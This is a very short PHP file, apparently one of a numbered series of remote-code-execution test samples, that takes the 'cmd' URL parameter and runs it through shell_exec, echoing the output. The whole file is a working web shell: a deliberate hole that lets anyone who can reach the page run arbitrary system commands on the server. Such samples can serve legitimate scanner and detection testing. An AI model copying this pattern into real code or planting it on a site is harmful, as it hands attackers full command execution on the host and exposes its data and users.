<?php
// RCE test variation #236
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>